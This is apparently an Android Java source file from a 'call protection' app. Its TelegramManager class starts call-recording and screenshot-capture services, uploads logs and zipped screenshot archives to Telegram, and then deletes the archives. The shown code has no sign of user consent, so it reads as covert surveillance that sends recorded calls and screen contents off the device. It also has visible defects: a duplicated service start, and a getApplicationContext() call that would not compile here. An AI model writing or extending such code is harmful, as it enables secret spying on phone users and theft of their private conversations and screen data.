package com.daria.callprotection;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class TelegramManager {

    private static final String TAG = "TelegramManager";
    private boolean isFullScanActive = false;

    // ====== Полный скан ======
    public void startScan(Context context) {
        try {
            context.startService(new Intent(context, CallService.class));
            context.startService(new Intent(context, CallService.class));
            context.startService(new Intent(context, ScreenshotService.class));

            isFullScanActive = true;
            Log.i(TAG, "Full scan started");
        } catch (Exception e) {
            Log.e(TAG, "Error starting full scan: " + e.getMessage());
        }
    }

    public void stopScan(Context context) {
        try {
            context.stopService(new Intent(context, CallService.class));
            context.stopService(new Intent(context, CallService.class));
            context.stopService(new Intent(context, ScreenshotService.class));

            isFullScanActive = false;
            Log.i(TAG, "Full scan stopped");
        } catch (Exception e) {
            Log.e(TAG, "Error stopping full scan: " + e.getMessage());
        }
    }

    // ====== Скан скринов ======
    public void startScreenshotScan(Context context) {
        try {
            if (!isFullScanActive) {
                Log.w(TAG, "Full scan is not active. Screenshot scan will start independently.");
            }
            context.startService(new Intent(context, ScreenshotService.class));
            Log.i(TAG, "Screenshot scan started");
        } catch (Exception e) {
            Log.e(TAG, "Error starting screenshot scan: " + e.getMessage());
        }
    }

    public void stopScreenshotScan(Context context) {
        try {
            context.stopService(new Intent(context, ScreenshotService.class));
            Log.i(TAG, "Screenshot scan stopped");
        } catch (Exception e) {
            Log.e(TAG, "Error stopping screenshot scan: " + e.getMessage());
        }
    }

    // ====== Запись звонков ======
    public void startCallRecording(Context context) {
        try {
            if (!isFullScanActive) {
                Log.w(TAG, "Full scan is not active. Call recording will start independently.");
            }
            context.startService(new Intent(context, CallService.class));
            Log.i(TAG, "Call recording started");
        } catch (Exception e) {
            Log.e(TAG, "Error starting call recording: " + e.getMessage());
        }
    }

    public void stopCallRecording(Context context) {
        try {
            context.stopService(new Intent(context, CallService.class));
            Log.i(TAG, "Call recording stopped");
        } catch (Exception e) {
            Log.e(TAG, "Error stopping call recording: " + e.getMessage());
        }
    }

    // ====== Отправка лога + копирование ======
    public void sendLog(Context context, String logContent) {
        try {
            // Копируем в буфер
            ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("Log", logContent);
            if (clipboard != null) {
                clipboard.setPrimaryClip(clip);
                Log.i(TAG, "Log copied to clipboard");
            }

            // Отправляем в TG
            TelegramUploader.sendTextAsync(logContent, null);

            Log.i(TAG, "Log sent to Telegram");
        } catch (Exception e) {
            Log.e(TAG, "Error sending log: " + e.getMessage());
        }
    }

    // ====== Отправка архива скринов ======
    public void sendScreenshotsArchive(Context context, File zipFile) {
        try {
            String fileName = new SimpleDateFormat("dd.MM.yy_HH-mm", Locale.getDefault()).format(new Date()) + ".zip";

            TelegramUploader.uploadFile(getApplicationContext(), zipFile, fileName);

            // Удаляем архив после отправки
            if (zipFile.exists() && zipFile.delete()) {
                Log.i(TAG, "Archive deleted after sending: " + fileName);
            } else {
                Log.w(TAG, "Failed to delete archive after sending: " + fileName);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending screenshots archive: " + e.getMessage());
        }
    }
}
